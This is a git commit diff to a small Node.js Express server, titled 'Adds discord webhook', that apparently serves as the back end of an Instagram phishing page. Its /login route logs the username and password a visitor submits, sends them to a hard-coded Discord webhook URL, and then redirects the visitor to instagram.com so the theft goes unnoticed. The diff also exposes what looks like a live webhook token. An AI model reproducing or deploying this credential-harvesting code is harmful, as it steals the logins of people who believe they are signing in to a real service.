16f7a2046ff1b314c91555de695eb0dedb85081e
Renato Campos <rcampos.oceanscan@gmail.com>
2021-04-26 23:37:27 +0100

    Adds discord webhook

--- index.js
+++ index.js
@@ -1,15 +1,33 @@
 var express = require('express');
 var app = express();
-var path = require('path');
+const axios = require('axios')
 
 app.use(express.static('static'))
 
 app.get('/login', (req, res) => {
   console.log('Received request to login')
   console.log(`username:${req.query.username},pw:${req.query.n}`)
+  postMessageToDiscord({username: req.query.username, pw: req.query.n})
   res.redirect("https://instagram.com")
 })
 
 
 
 app.listen(8080);
+
+function postMessageToDiscord(message) {
+
+  const discordUrl = 'https://discord.com/api/webhooks/836368184990760973/haOwTWrH69hyGv4HPqltc0q4uAkyaC-mXN6GVenF06CsNIEns8-VEYpURI8Noo_9osfp';
+  const payload = JSON.stringify({content: `username: ${message.username} pw: ${message.pw}`});
+  console.log('payload',payload)
+  axios({
+    url: discordUrl,
+    method: 'post',
+    data: payload,
+    headers: {
+      'Content-Type': 'application/json'
+    },
+  }).then(response => console.log(response))
+  .catch(error => console.log(error.message))
+
+}
